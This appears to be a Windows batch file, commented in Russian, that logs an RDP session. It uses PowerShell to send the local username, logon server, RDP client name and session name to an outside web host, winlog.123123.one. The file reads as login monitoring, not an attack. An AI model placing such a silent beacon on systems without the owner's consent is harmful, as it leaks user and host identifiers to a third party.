@echo off

// Откроет кмд, выведет респонс хтмл и закроется
powershell.exe -noprofile -command "Invoke-WebRequest -Uri http://winlog.123123.one/?data=123234_DedicName:123@ACTION:123@@LocalUser:%USERNAME%@WinDOMAIN:%LOGONSERVER%@RemotePcUsername:%CLIENTNAME%@RdpSessionName:%SESSIONNAME%"

exit